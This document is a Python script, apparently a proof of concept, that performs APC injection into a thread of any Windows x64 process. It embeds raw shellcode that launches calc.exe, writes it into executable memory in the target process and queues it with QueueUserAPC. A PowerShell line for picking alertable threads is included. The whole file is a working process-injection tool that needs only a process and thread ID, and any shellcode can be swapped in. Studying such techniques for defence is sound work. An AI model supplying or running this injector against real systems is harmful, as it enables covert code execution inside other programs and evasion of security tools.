"""
(barebones) APC Injection into a thread - targeted
- arch: x64 process on x64 systems / 64-bit / PE32+
- target: (any process)
- payload: shellcode -> calc.exe

Description:
- inject an APC object into a thread's APC queue
- object points to shellcode, executes if/when thread enters an alertable wait state

Note: this script contains a short PowerShell script to find Threads associated with a ProcessId
"""

import ctypes
from ctypes import wintypes
from ctypes.wintypes import HANDLE, LPVOID, DWORD, LPCVOID, BOOL

kernel32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)

# msfvenon shellcode to spawn calc.exe - appended with NOPs (\x90) and infinite loop (\xEB\xFE -> jmp $)
# so that injected process (eg notepad) doesn't die and exit (viewable in ProcExp, TaskManager etc)
buf =  b"\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d"
buf += b"\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01"
buf += b"\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01"
buf += b"\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31"
buf += b"\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45"
buf += b"\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b"
buf += b"\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31"
buf += b"\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2"
buf += b"\x48\xff\xc2\x48\x83\xec\x28\xff\xd0"
payload = buf +  b"\x90\x90\x90\xEB\xFE"


kernel32.VirtualAllocEx.argtypes = [HANDLE, LPVOID, ctypes.c_size_t, DWORD, DWORD,]
kernel32.VirtualAllocEx.restype = ctypes.c_void_p

kernel32.WriteProcessMemory.argtypes = [HANDLE, LPVOID, LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t),]
kernel32.WriteProcessMemory.restype = BOOL

# Powershell script - use to select ProcessId and ThreadId
#Get-Process -id <ProcessId> | Select-Object -ExpandProperty Threads | Select-Object Id, PriorityLevel, ThreadState, StartTime | Format-Table | findstr /i wait

ProcessId = <change>
ThreadId  = <change>

# open handles to process and thread
hProcess = kernel32.OpenProcess(0x1F0FFF, False, ProcessId)  # PROCESS_ALL_ACCESS
hThread = kernel32.OpenThread(0x1FFFFF, False, ThreadId)     #THREAD_ALL_ACCESS

# allocate memory
lpBaseAddress = kernel32.VirtualAllocEx(hProcess, None, len(payload), 0x1000 | 0x2000, 0x40)

# write payload
kernel32.WriteProcessMemory(hProcess, lpBaseAddress, payload, len(payload), None)

# execute - add to APC queue
kernel32.QueueUserAPC(lpBaseAddress, hThread, 0)

# cleanup
kernel32.CloseHandle(hProcess)
kernel32.CloseHandle(hThread)
